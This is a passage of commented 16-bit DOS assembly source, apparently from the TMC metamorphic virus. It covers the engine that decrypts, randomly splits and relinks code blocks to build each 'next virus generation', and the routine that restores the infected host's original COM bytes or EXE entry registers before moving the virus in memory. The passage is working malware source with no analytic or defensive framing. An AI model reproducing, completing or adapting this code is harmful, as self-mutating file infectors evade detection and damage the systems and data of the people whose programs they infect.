             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bb8h               ; Pointer to tmc_ini_loo
             db      11101111b           ; End of block
next_byte_   db      11101110b           ; Beginning of block
             dw      0bbbh               ; Block identification of next_byte_
             db      02h                 ; Two bytes instruction

             mov     al,02h              ; Add two to offset within table

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bb8h               ; Pointer to tmc_ini_loo
             db      11101111b           ; End of block
calc_blocks_ db      11101110b           ; Beginning of block
             dw      0bbch               ; Block identification of calc_blo...
             db      03h                 ; Three bytes instruction

             lea     ax,[di-10h]         ; AX = number of blocks multiplied...

             db      02h                 ; Two bytes instruction

             shr     ax,01h              ; Divide number of blocks by two

             db      02h                 ; Two bytes instruction

             shr     ax,01h              ; Divide number of blocks by two

             db      04h                 ; Four bytes instruction

             mov     es:[0ah],ax         ; Store number of blocks

             db      02h                 ; Two bytes instruction

             xor     ax,ax               ; End of table

             db      01h                 ; One byte instruction

             stosw                       ; Store end of table

             db      03h                 ; Three bytes instruction

             mov     di,10h              ; DI = offset of table of blocks

             db      03h                 ; Three bytes instruction

             mov     si,es:[di]          ; SI = offset of block within table

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc0h               ; Pointer to exam_bl
             db      11101111b           ; End of block
split_bloc   db      11101110b           ; Beginning of block
             dw      0bbdh               ; Block identification of split_bloc
             db      01h                 ; One byte instruction

             push    bp                  ; Save BP at stack

             db      05h                 ; Five bytes instruction

             mov     bp,es:[0ah]         ; BP = number of blocks

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0bd5h               ; Pointer to rnd_in_rang
             db      01h                 ; One byte instruction

             pop     bp                  ; Load BP from stack

             db      02h                 ; Two bytes instruction

             shl     ax,01h              ; Multiply random number with two

             db      02h                 ; Two bytes instruction

             shl     ax,01h              ; Multiply random number with two

             db      03h                 ; Three bytes instruction

             add     ax,10h              ; Add ten to random number

             db      02h                 ; Two bytes instruction

             mov     di,ax               ; DI = random offset within table

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bbeh               ; Pointer to exam_nxt_bl_
             db      11101111b           ; End of block
exam_nxt_bl_ db      11101110b           ; Beginning of block
             dw      0bbeh               ; Block identification of exam_nxt...
             db      03h                 ; Three bytes instruction

             add     di,04h              ; DI = offset of next offset withi...

             db      03h                 ; Three bytes instruction

             mov     si,es:[di]          ; SI = offset of next block within...

             db      02h                 ; Two bytes instruction

             or      si,si               ; End of table?

             db      01110101b+10000000b ; Not zero? Jump to exam_blo____
             dw      0bbfh               ; Pointer to exam_blo____
             db      03h                 ; Three bytes instruction

             mov     di,10h              ; DI = offset of table of blocks

             db      03h                 ; Three bytes instruction

             mov     si,es:[di]          ; SI = offset of block within table

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bbfh               ; Pointer to exam_blo____
             db      11101111b           ; End of block
exam_blo____ db      11101110b           ; Beginning of block
             dw      0bbfh               ; Block identification of exam_blo...
             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be0h               ; Pointer to decrypt_byt
             db      01h                 ; One byte instruction

             dec     si                  ; Decrease offset of block within ...

             db      02h                 ; Two bytes instruction

             cmp     al,11101111b        ; End of block?

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack

             db      01110101b+10000000b ; Not equal? Jump to exam_bl
             dw      0bc0h               ; Pointer to exam_bl
             db      02h                 ; Two bytes instruction

             cmp     di,ax               ; End of table of blocks?

             db      01110101b+10000000b ; Not equal? Jump to exam_nxt_bl_
             dw      0bbeh               ; Pointer to exam_nxt_bl_
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bcah               ; Pointer to exam_tbl_in
             db      11101111b           ; End of block
exam_bl      db      11101110b           ; Beginning of block
             dw      0bc0h               ; Block identification of exam_bl
             db      04h                 ; Four bytes instruction

             mov     ax,es:[di+02h]      ; AX = block information

             db      03h                 ; Three bytes instruction

             cmp     ax,0ffffh           ; Block is still in one part?

             db      01110100b+10000000b ; Equal? Jump to exam_bl_
             dw      0bc1h               ; Pointer to exam_bl_
             db      01h                 ; One byte instruction

             push    di                  ; Save DI at stack

             db      02h                 ; Two bytes instruction

             mov     di,ax               ; DI = offset of end of first part...

             db      02h                 ; Two bytes instruction

             mov     al,11101001b        ; JMP imm16 (opcode 0e9h)

             db      01h                 ; One byte instruction

             stosb                       ; Store JMP imm16

             db      02h                 ; Two bytes instruction

             mov     ax,bx               ; AX = offset within next virus ge...

             db      01h                 ; One byte instruction

             dec     ax                  ; Decrease offset within next viru...

             db      01h                 ; One byte instruction

             dec     ax                  ; Decrease offset within next viru...

             db      02h                 ; Two bytes instruction

             sub     ax,di               ; Subtract offset of end of first ...

             db      01h                 ; One byte instruction

             stosw                       ; Store 16-bit immediate

             db      01h                 ; One byte instruction

             pop     di                  ; Load DI from stack

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc1h               ; Pointer to exam_bl_
             db      11101111b           ; End of block
exam_bl_     db      11101110b           ; Beginning of block
             dw      0bc1h               ; Block identification of exam_bl_
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be0h               ; Pointer to decrypt_byt
             db      02h                 ; Two bytes instruction

             cmp     al,11101111b        ; End of block?

             db      01110100b+10000000b ; Equal? Jump to end_of_bloc
             dw      0bc9h               ; Pointer to end_of_bloc
             db      02h                 ; Two bytes instruction

             cmp     al,10h              ; Data; CALL; JMP; Data reference...?

             db      01110111b+10000000b ; Above? Jump to exam_bl__
             dw      0bc2h               ; Pointer to exam_bl__
             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      01h                 ; One byte instruction

             push    bp                  ; Save BP at stack

             db      04h                 ; Four bytes instruction

             mov     bp,[bp+1234h]       ; BP = probability

             db      11101101b           ; Data reference
             dw      0bech               ; Pointer to probability_
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0bd5h               ; Pointer to rnd_in_rang
             db      02h                 ; Two bytes instruction

             or      ax,ax               ; Split up block?

             db      01h                 ; One byte instruction

             pop     bp                  ; Load BP from stack

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack

             db      01110100b+10000000b ; Zero? Jump to split_bloc_
             dw      0bc8h               ; Pointer to split_bloc_
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc2h               ; Pointer to exam_bl__
             db      11101111b           ; End of block
exam_bl__    db      11101110b           ; Beginning of block
             dw      0bc2h               ; Block identification of exam_bl__
             db      02h                 ; Two bytes instruction

             cmp     al,11101111b        ; End of block?

             db      01110100b+10000000b ; Equal? Jump to end_of_bloc
             dw      0bc9h               ; Pointer to end_of_bloc
             db      02h                 ; Two bytes instruction

             cmp     al,11101000b        ; CALL; JMP; Data reference; Jcc?

             db      01110011b+10000000b ; Above or equal? Jump to exam_data_
             dw      0bc4h               ; Pointer to exam_data_
             db      02h                 ; Two bytes instruction

             cmp     al,10h              ; Data?

             db      01110110b+10000000b ; Below or equal? Jump to sto_instruc
             dw      0bc3h               ; Pointer to sto_instruc
             db      02h                 ; Two bytes instruction

             sub     al,10h              ; AL = length of data

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc3h               ; Pointer to sto_instruc
             db      11101111b           ; End of block
sto_instruc  db      11101110b           ; Beginning of block
             dw      0bc3h               ; Block identification of sto_instruc
             db      02h                 ; Two bytes instruction

             xor     cx,cx               ; Zero CX

             db      02h                 ; Two bytes instruction

             mov     cl,al               ; CL = length of instruction

             db      01h                 ; One byte instruction

             push    di                  ; Save DI at stack

             db      02h                 ; Two bytes instruction

             mov     di,bx               ; DI = offset within next virus ge...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0beah               ; Pointer to sto_ins_loo
             db      11101111b           ; End of block
sto_ins_loo  db      11101110b           ; Beginning of block
             dw      0beah               ; Block identification of sto_ins_loo
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be0h               ; Pointer to decrypt_byt
             db      01h                 ; One byte instruction

             stosb                       ; Store byte of instruction

             db      01h                 ; One byte instruction

             dec     cx                  ; Decrease counter

             db      01110101b+10000000b ; Not zero? Jump to sto_ins_loo
             dw      0beah               ; Pointer to sto_ins_loo
             db      02h                 ; Two bytes instruction

             mov     bx,di               ; BX = offset within next virus ge...

             db      01h                 ; One byte instruction

             pop     di                  ; Load DI from stack

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc1h               ; Pointer to exam_bl_
             db      11101111b           ; End of block
exam_data_   db      11101110b           ; Beginning of block
             dw      0bc4h               ; Block identification of exam_data_
             db      02h                 ; Two bytes instruction

             cmp     al,11101101b        ; Data reference?

             db      01110101b+10000000b ; Not equal? Jump to exam_bl___
             dw      0bc5h               ; Pointer to exam_bl___
             db      01h                 ; One byte instruction

             push    di                  ; Load DI from stack

             db      05h                 ; Five bytes instruction

             mov     di,es:[08h]         ; DI = offset within data information

             db      02h                 ; Two bytes instruction

             mov     ax,bx               ; AX = offset within next virus ge...

             db      01h                 ; One byte instruction

             dec     ax                  ; Decrease offset within next viru...

             db      01h                 ; One byte instruction

             dec     ax                  ; Decrease offset within next viru...

             db      01h                 ; One byte instruction

             stosw                       ; Store offset within next virus g...

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be1h               ; Pointer to decrypt_id_
             db      01h                 ; One byte instruction

             stosw                       ; Store block identification

             db      05h                 ; Five bytes instruction

             mov     es:[08h],di         ; Store offset within data informa...

             db      01h                 ; One byte instruction

             pop     di                  ; Load DI from stack

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc1h               ; Pointer to exam_bl_
             db      11101111b           ; End of block
exam_bl___   db      11101110b           ; Beginning of block
             dw      0bc5h               ; Block identification of exam_bl___
             db      02h                 ; Two bytes instruction

             cmp     al,11101110b        ; Beginning of block?

             db      01110101b+10000000b ; Not equal? Jump to sto_call_jm_
             dw      0bc7h               ; Pointer to sto_call_jm_
             db      01h                 ; One byte instruction

             push    di                  ; Save DI at stack

             db      05h                 ; Five bytes instruction

             mov     di,es:[04h]         ; DI = offset within block informa...

             db      02h                 ; Two bytes instruction

             mov     ax,bx               ; AX = offset within next virus ge...

             db      01h                 ; One byte instruction

             stosw                       ; Store offset within next virus ge...

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be1h               ; Pointer to decrypt_id_
             db      01h                 ; One byte instruction

             stosw                       ; Store block identification

             db      05h                 ; Five bytes instruction

             mov     es:[04h],di         ; Store offset within block inform...

             db      03h                 ; Three bytes instruction

             cmp     ax,4c5h             ; Block identification of tmc_table_?

             db      01110101b+10000000b ; Not equal? Jump to exam_messag
             dw      0bc6h               ; Pointer to exam_messag
             db      01h                 ; One byte instruction

             push    si                  ; Save SI at stack

             db      02h                 ; Two bytes instruction

             mov     di,bx               ; DI = offset within next virus ge...

             db      04h                 ; Four bytes instruction

             lea     si,[bp+1234h]       ; SI = offset of tmc_table_

             db      11101101b           ; Data reference
             dw      4c5h                ; Pointer to tmc_table_
             db      03h                 ; Three bytes instruction

             mov     cx,(table_end-table_begin)

             db      02h                 ; Two bytes instruction

             rep     movsb               ; Move table to top of memory

             db      02h                 ; Two bytes instruction

             mov     bx,di               ; BX = offset within next virus ge...

             db      01h                 ; One byte instruction

             pop     si                  ; Load SI from stack

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bebh               ; Pointer to examine_nex
             db      11101111b           ; End of block
exam_messag  db      11101110b           ; Beginning of block
             dw      0bc6h               ; Block identification of exam_messag
             db      03h                 ; Three bytes instruction

             cmp     ax,2328h            ; Block identification of message?

             db      01110101b+10000000b ; Not equal? Jump to exam_probab
             dw      0bedh               ; Pointer to exam_probab
             db      03h                 ; Three bytes instruction

             mov     ax,14h              ; Probability of including message

             db      04h                 ; Four bytes instruction

             cmp     [bp+1234h],ax       ; Include message?

             db      11101101b           ; Data reference
             dw      0bech               ; Pointer to probability_
             db      01110011b+10000000b ; Above or equal? Jump to examine_...
             dw      0bebh               ; Pointer to examine_nex
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be0h               ; Pointer to decrypt_byt
             db      02h                 ; Two bytes instruction

             sub     al,10h              ; AL = length of message

             db      02h                 ; Two bytes instruction

             mov     ah,00h              ; Zero AH

             db      02h                 ; Two bytes instruction

             add     si,ax               ; SI = offset of end of message

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bebh               ; Pointer to examine_nex
             db      11101111b           ; End of block
exam_probab  db      11101110b           ; Beginning of block
             dw      0bedh               ; Block identification of exam_probab
             db      03h                 ; Three bytes instruction

             cmp     ax,0bech            ; Block identification of probabi...?

             db      01110101b+10000000b ; Not equal? Jump to examine_nex
             dw      0bebh               ; Pointer to examine_nex
             db      04h                 ; Four bytes instruction

             mov     ax,[bp+1234h]       ; AX = probability_

             db      11101101b           ; Data reference
             dw      0bech               ; Pointer to probability_
             db      01h                 ; One byte instruction

             dec     ax                  ; Decrease probability

             db      03h                 ; Three bytes instruction

             cmp     ax,05h              ; Probability too small?

             db      01110011b+10000000b ; Above or equal? Jump to store_pr...
             dw      0bf5h               ; Pointer to store_proba
             db      03h                 ; Three bytes instruction

             mov     ax,64h              ; Reset probability

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bf5h               ; Pointer to store_proba
             db      11101111b           ; End of block
store_proba  db      11101110b           ; Beginning of block
             dw      0bf5h               ; Block identification of store_proba
             db      03h                 ; Three bytes instruction

             mov     es:[bx],ax          ; Store probability

             db      03h                 ; Three bytes instruction

             add     bx,02h              ; Add two to offset within next vi...

             db      03h                 ; Three bytes instruction

             add     si,03h              ; SI = offset of beginning of next...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bebh               ; Pointer to examine_nex
             db      11101111b           ; End of block
examine_nex  db      11101110b           ; Beginning of block
             dw      0bebh               ; Block identification of examine_nex
             db      01h                 ; One byte instruction

             pop     di                  ; Load DI from stack

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be0h               ; Pointer to decrypt_byt
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc2h               ; Pointer to exam_bl__
             db      11101111b           ; End of block
sto_call_jm_ db      11101110b           ; Beginning of block
             dw      0bc7h               ; Block identification of sto_call...
             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      01h                 ; One byte instruction

             push    di                  ; Save DI at stack

             db      05h                 ; Five bytes instruction

             mov     di,es:[06h]         ; DI = offset within CALL; JMP; Jc...

             db      02h                 ; Two bytes instruction

             mov     ax,bx               ; AX = offset within next virus ge...

             db      01h                 ; One byte instruction

             stosw                       ; Store offset within next virus g...

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be1h               ; Pointer to decrypt_id_
             db      01h                 ; One byte instruction

             stosw                       ; Store block identification

             db      05h                 ; Five bytes instruction

             mov     es:[06h],di         ; Store offset within CALL; JMP; J...

             db      01h                 ; One byte instruction

             pop     di                  ; Load DI from stack

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack

             db      03h                 ; Three bytes instruction

             mov     es:[bx],al          ; Store CALL imm16; JMP imm16; Jcc...

             db      03h                 ; Three bytes instruction

             add     bx,03h              ; Add three to offset within next ...

             db      02h                 ; Two bytes instruction

             cmp     al,11110000b        ; Jump condition?

             db      01110010b+10000000b ; Below? Jump to exam_bl_
             dw      0bc1h               ; Pointer to exam_bl_
             db      01h                 ; One byte instruction

             inc     bx                  ; Increase offset within next viru...

             db      01h                 ; One byte instruction

             inc     bx                  ; Increase offset within next viru...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc1h               ; Pointer to exam_bl_
             db      11101111b           ; End of block
split_bloc_  db      11101110b           ; Beginning of block
             dw      0bc8h               ; Block identification of split_bloc_
             db      04h                 ; Four bytes instruction

             mov     es:[di+02h],bx      ; Store offset within next virus g...

             db      03h                 ; Three bytes instruction

             add     bx,03h              ; Add three to offset within next ...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bc9h               ; Pointer to end_of_bloc
             db      11101111b           ; End of block
end_of_bloc  db      11101110b           ; Beginning of block
             dw      0bc9h               ; Block identification of end_of_bloc
             db      01h                 ; One byte instruction

             dec     si                  ; Decrease offset of block within ...

             db      03h                 ; Three bytes instruction

             mov     es:[di],si          ; Store offset of block within table

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bbdh               ; Pointer to of split_bloc
             db      11101111b           ; End of block
exam_tbl_in  db      11101110b           ; Beginning of block
             dw      0bcah               ; Block identification of exam_tbl_in
             db      06h                 ; Six bytes instruction

             cmp     word ptr es:[0ch],00h

             db      01110101b+10000000b ; End of second table? Jump to cor...
             dw      0fa1h               ; Pointer to correc_i16
             db      01h                 ; One byte instruction

             pop     si                  ; Load SI from stack

             db      05h                 ; Five bytes instruction

             mov     es:[0ch],bx         ; Store offset within next virus g...

             db      04h                 ; Four bytes instruction

             add     si,(second_table-first_table)

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0fa0h               ; Pointer to initial_tmc
             db      11101111b           ; End of block
correc_i16   db      11101110b           ; Beginning of block
             dw      0fa1h               ; Block identification of correc_i16
             db      01h                 ; One byte instruction

             push    es                  ; Save ES at stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack (ES)

             db      04h                 ; Four bytes instruction

             sub     bx,730h             ; Subtract offset of next virus ge...

             db      04h                 ; Four bytes instruction

             mov     ds:[0eh],bx         ; Store length of virus

             db      03h                 ; Three bytes instruction

             mov     si,2c8h             ; SI = offset of CALL; JMP; Jcc im...

             db      04h                 ; Four bytes instruction

             mov     cx,ds:[06h]         ; CX = offset of end of CALL; JMP;...

             db      02h                 ; Two bytes instruction

             sub     cx,si               ; Subtract offset of CALL; JMP; Jc...

             db      02h                 ; Two bytes instruction

             shr     cx,01h              ; Divide number of CALL imm16; JMP...

             db      02h                 ; Two bytes instruction

             shr     cx,01h              ; Divide number of CALL imm16; JMP...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bcbh               ; Pointer to jmp_call_lo
             db      11101111b           ; End of block
jmp_call_lo  db      11101110b           ; Beginning of block
             dw      0bcbh               ; Block identification of jmp_call_lo
             db      01h                 ; One byte instruction

             lodsw                       ; AX = offset of block within data...

             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      01h                 ; One byte instruction

             lodsw                       ; AX = offset of block within data...

             db      01h                 ; One byte instruction

             push    cx                  ; Save CX at stack

             db      01h                 ; One byte instruction

             push    si                  ; Save SI at stack

             db      03h                 ; Three bytes instruction

             mov     si,118h             ; SI = offset of block information

             db      04h                 ; Four bytes instruction

             mov     cx,ds:[04h]         ; CX = offset of end of block info...

             db      02h                 ; Two bytes instruction

             sub     cx,si               ; Subtract offset of block informa...

             db      02h                 ; Two bytes instruction

             shr     cx,01h              ; Divide number of block by two

             db      02h                 ; Two bytes instruction

             shr     cx,01h              ; Divide number of block by two

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bcch               ; Pointer to find_block__
             db      11101111b           ; End of block
find_block__ db      11101110b           ; Beginning of block
             dw      0bcch               ; Block identification of find_blo...
             db      03h                 ; Three bytes instruction

             cmp     ax,[si+02h]         ; Found block?

             db      01110100b+10000000b ; Equal? Jump to found_bloc
             dw      0bcdh               ; Pointer to found_bloc
             db      03h                 ; Three bytes instruction

             add     si,04h              ; SI = offset of next block in table

             db      01h                 ; One byte instruction

             dec     cx                  ; Decrease counter

             db      01110101b+10000000b ; Not zero? Jump to find_block__
             dw      0bcch               ; Pointer to find_block__
             db      11101111b           ; End of block
found_bloc   db      11101110b           ; Beginning of block
             dw      0bcdh               ; Block identification of found_bloc
             db      02h                 ; Two bytes instruction

             mov     dx,[si]             ; DX = offset of block

             db      01h                 ; One byte instruction

             pop     si                  ; Load SI from stack

             db      01h                 ; One byte instruction

             pop     cx                  ; Load CX from stack

             db      01h                 ; One byte instruction

             pop     bx                  ; Load BX from stack (AX)

             db      02h                 ; Two bytes instruction

             mov     al,[bx]             ; AL = first byte of instruction

             db      02h                 ; Two bytes instruction

             cmp     al,11110000b        ; Jump condition?

             db      01110010b+10000000b ; Below? Jump to sto_call_j
             dw      0bcfh               ; Pointer to sto_call_j
             db      03h                 ; Three bytes instruction

             sub     byte ptr [bx],10000000b
             
             db      01h                 ; One byte instruction

             inc     bx                  ; BX = offset of 8-bit immediate

             db      01h                 ; One byte instruction

             push    dx                  ; Save DX at stack

             db      02h                 ; Two bytes instruction

             sub     dx,bx               ; Subtract offset within next viru...

             db      01h                 ; One byte instruction

             dec     dx                  ; Decrease 8-bit immediate

             db      03h                 ; Three bytes instruction

             cmp     dx,7fh              ; 8-bit immediate out of range?

             db      01111111b+10000000b ; Greater? Jump to invert_jcc_
             dw      0bceh               ; Pointer to invert_jcc_
             db      03h                 ; Three bytes instruction

             cmp     dx,0ff80h           ; 8-bit immediate out of range?

             db      01111100b+10000000b ; Less? Jump to invert_jcc_
             dw      0bceh               ; Pointer to invert_jcc_
             db      02h                 ; Two bytes instruction

             mov     [bx],dl             ; Store 8-bit immediate

             db      01h                 ; One byte instruction

             inc     bx                  ; BX = offset of end of Jcc imm8

             db      04h                 ; Four bytes instruction

             mov     [bx],1001000010010000b

             db      04h                 ; Four bytes instruction

             mov     byte ptr [bx+02h],10010000b

             db      01h                 ; One byte instruction

             pop     dx                  ; Load DX from stack

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bd0h               ; Pointer to correc_i16_
             db      11101111b           ; End of block
invert_jcc_  db      11101110b           ; Beginning of block
             dw      0bceh               ; Block identification of invert_jcc_
             db      01h                 ; One byte instruction

             pop     dx                  ; Load DX from stack

             db      01h                 ; One byte instruction

             dec     bx                  ; BX = offset of Jcc imm8

             db      03h                 ; Three bytes instruction

             xor     byte ptr [bx],00000001b

             db      01h                 ; One byte instruction

             inc     bx                  ; BX = offset of 8-bit immediate

             db      03h                 ; Three bytes instruction

             mov     byte ptr [bx],03h   ; Store 8-bit immediate

             db      01h                 ; One byte instruction

             inc     bx                  ; BX = offset of JMP imm16

             db      02h                 ; Two bytes instruction

             mov     al,11101001b        ; JMP imm16 (opcode 0e9h)

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bcfh               ; Pointer to sto_call_j
             db      11101111b           ; End of block
sto_call_j   db      11101110b           ; Beginning of block
             dw      0bcfh               ; Block identification of sto_call_j
             db      02h                 ; Two bytes instruction

             mov     [bx],al             ; Store CALL imm16; JMP imm16

             db      01h                 ; One byte instruction

             inc     bx                  ; BX = offset of 16-bit immediate

             db      02h                 ; Two bytes instruction

             sub     dx,bx               ; Subtract offset within next viru...

             db      01h                 ; One byte instruction

             dec     dx                  ; Decrease 16-bit immediate

             db      01h                 ; One byte instruction

             dec     dx                  ; Decrease 16-bit immediate

             db      02h                 ; Two bytes instruction

             mov     [bx],dx             ; Store 16-bit immediate

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bd0h               ; Pointer to correc_i16_
             db      11101111b           ; End of block
correc_i16_  db      11101110b           ; Beginning of block
             dw      0bd0h               ; Block identification of correc_16_
             db      01h                 ; One byte instruction

             dec     cx                  ; Decrease counter

             db      01110101b+10000000b ; Not zero? Jump to jmp_call_lo
             dw      0bcbh               ; Pointer to jmp_call_lo
             db      03h                 ; Three bytes instruction

             mov     si,5a8h             ; SI = offset of data information

             db      04h                 ; Four bytes instruction

             mov     cx,ds:[08h]         ; CX = offset of end of data infor...

             db      02h                 ; Two bytes instruction

             sub     cx,si               ; Subtract offset of data informat...

             db      02h                 ; Two bytes instruction

             shr     cx,01h              ; Divide number of data references...

             db      02h                 ; Two bytes instruction

             shr     cx,01h              ; Divide number of data references...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bd1h               ; Pointer to data_ref_lo
             db      11101111b           ; End of block
data_ref_lo  db      11101110b           ; Beginning of block
             dw      0bd1h               ; Block identification of data_ref_lo
             db      01h                 ; One byte instruction

             lodsw                       ; AX = offset of block within data...

             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      01h                 ; One byte instruction

             lodsw                       ; AX = offset of block within data...

             db      01h                 ; One byte instruction

             push    cx                  ; Save CX at stack

             db      01h                 ; One byte instruction

             push    si                  ; Save SI at stack

             db      03h                 ; Three bytes instruction

             mov     si,118h             ; SI = offset of block information

             db      04h                 ; Four bytes instruction

             mov     cx,ds:[04h]         ; CX = offset of end of block info...

             db      02h                 ; Two bytes instruction

             sub     cx,si               ; Subtract offset of block informa...

             db      02h                 ; Two bytes instruction

             shr     cx,01h              ; Divide number of block by two

             db      02h                 ; Two bytes instruction

             shr     cx,01h              ; Divide number of block by two

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bd2h               ; Pointer to find_bloc
             db      11101111b           ; End of block
find_bloc    db      11101110b           ; Beginning of block
             dw      0bd2h               ; Block identification to find_bloc
             db      03h                 ; Three bytes instruction

             cmp     ax,[si+02h]         ; Found block?

             db      01110100b+10000000b ; Equal? Jump to found_bloc_
             dw      0bd3h               ; Pointer to found_bloc_
             db      03h                 ; Three bytes instruction

             add     si,04h              ; SI = offset of next block in table

             db      01h                 ; One byte instruction

             dec     cx                  ; Decrease counter

             db      01110101b+10000000b ; Not zero? Jump to find_bloc
             dw      0bd2h               ; Pointer to find_bloc
             db      11101111b           ; End of block
found_bloc_  db      11101110b           ; Beginning of block
             dw      0bd3h               ; Block identification of found_bloc_
             db      02h                 ; Two bytes instruction

             mov     ax,[si]             ; AX = offset of block

             db      01h                 ; One byte instruction

             pop     si                  ; Load SI from stack

             db      01h                 ; One byte instruction

             pop     cx                  ; Load CX from stack

             db      01h                 ; One byte instruction

             pop     bx                  ; Load BX from stack (AX)

             db      03h                 ; Three bytes instruction

             sub     ax,730h             ; Subtract offset of next virus ge...

             db      02h                 ; Two bytes instruction

             mov     [bx],ax             ; Store 16-bit immediate

             db      01h                 ; One byte instruction

             dec     cx                  ; Decrease counter

             db      01110101b+10000000b ; Not zero? Jump to data_ref_lo
             dw      0bd1h               ; Pointer to data_ref_lo
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1772h               ; Pointer to restore_cod
             db      11101111b           ; End of block
restore_cod  db      11101110b           ; Beginning of block
             dw      1772h               ; Block identification of restore_cod
             db      04h                 ; Four bytes instruction

             mov     ax,[bp+1234h]       ; AX = segment of PSP for current ...

             db      11101101b           ; Data reference
             dw      0befh               ; Pointer to program_seg_
             db      04h                 ; Four bytes instruction

             mov     cx,[bp+1234h]       ; CX = initial SS relative to star...

             db      11101101b           ; Data reference
             dw      138ah               ; Pointer to initial_ss_
             db      03h                 ; Three bytes instruction

             add     cx,10h              ; Add ten to initial SS relative t...

             db      02h                 ; Two bytes instruction

             add     cx,ax               ; Add segment of PSP for current p...

             db      01h                 ; One byte instruction

             push    cx                  ; Save CX at stack

             db      04h                 ; Four bytes instruction

             push    [bp+1234h]          ; Save initial SP at stack

             db      11101101b           ; Data reference
             dw      138ch               ; Pointer to initial_sp_
             db      04h                 ; Four bytes instruction

             mov     cx,[bp+1234h]       ; CX = initial CS relative to star...

             db      11101101b           ; Data reference
             dw      1389h               ; Pointer to initial_cs_
             db      03h                 ; Three bytes instruction

             add     cx,10h              ; Add ten to initial CS relative t...

             db      02h                 ; Two bytes instruction

             add     cx,ax               ; Add segment of PSP for current p...

             db      01h                 ; One byte instruction

             push    cx                  ; Save CX at stack

             db      04h                 ; Four bytes instruction

             push    [bp+1234h]          ; Save initial IP at stack

             db      11101101b           ; Data reference
             dw      138bh               ; Pointer to initial_ip_
             db      01h                 ; One byte instruction

             push    ax                  ; Save segment of PSP for current ...

             db      04h                 ; Four bytes instruction

             push    [bp+1234h]          ; Save size of memory block in par...

             db      11101101b           ; Data reference
             dw      1395h               ; Pointer to mcb_size__
             db      01h                 ; One byte instruction

             push    ds                  ; Save DS at stack

             db      02h                 ; Two bytes instruction

             mov     cl,00h              ; COM executable

             db      04h                 ; Four bytes instruction

             cmp     [bp+1234h],cl       ; COM executable?

             db      11101101b           ; Data reference
             dw      1388h               ; Pointer to executa_sta
             db      01110101b+10000000b ; Not equal? Jump to move_virus__
             dw      1390h               ; Pointer to move_virus__
             db      04h                 ; Four bytes instruction

             lea     si,[bp+1234h]       ; SI = offset of origin_code_

             db      11101101b           ; Data reference
             dw      1f40h               ; Pointer to origin_code_
             db      03h                 ; Three bytes instruction

             mov     ax,cs:[si]          ; AX = first two bytes of original...

             db      04h                 ; Four bytes instruction

             mov     cs:[100h],ax        ; Store first two bytes of origina...

             db      04h                 ; Four bytes instruction

             mov     al,cs:[si+02h]      ; AL = last byte of original code ...

             db      04h                 ; Four bytes instruction

             mov     cs:[100h+02h],al    ; Store last byte of original code...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1390h               ; Pointer to move_virus__
             db      11101111b           ; End of block
             db      11101110b           ; Beginning of block
             dw      1774h
             db      04h                 ; Four bytes instruction

             mov     ax,[bp+1234h]       ; AX = segment of PSP for current ...

             db      11101101b           ; Data reference
             dw      0befh               ; Pointer to program_seg_
             db      04h                 ; Four bytes instruction

             mov     cx,[bp+1234h]       ; CX = initial SS relative to star...

             db      11101101b           ; Data reference
             dw      138ah               ; Pointer to initial_ss_
             db      03h                 ; Three bytes instruction

             add     cx,10h              ; Add ten to initial SS relative t...

             db      02h                 ; Two bytes instruction

             add     cx,ax               ; Add segment of PSP for current p...

             db      01h                 ; One byte instruction

             push    cx                  ; Save CX at stack

             db      04h                 ; Four bytes instruction

             push    [bp+1234h]          ; Save initial SP at stack

             db      11101101b           ; Data reference
